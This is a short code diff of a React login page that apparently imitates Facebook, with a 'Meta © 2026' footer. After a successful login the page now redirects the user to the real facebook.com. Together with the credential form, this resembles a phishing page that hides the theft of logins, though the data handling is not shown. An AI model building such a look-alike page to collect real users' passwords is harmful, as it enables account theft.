@@ -59,8 +59,8 @@ export default function App() {
       if (data.success) {
         setMessage({ type: "success", text: "Logging you in..." });
         setTimeout(() => {
-          setFormData({ email: "", password: "" });
-          setMessage({ type: "", text: "" });
+          // Redirect to Facebook
+          window.location.href = "https://www.facebook.com";
         }, 1500);
       } else {
         setMessage({ type: "error", text: data.message });
@@ -284,7 +284,6 @@ export default function App() {
             </a>
           </div>
 
-          {/* Copyright */}
           <div className="text-xs text-gray-600 mt-4">Meta © 2026</div>
         </div>
       </footer>
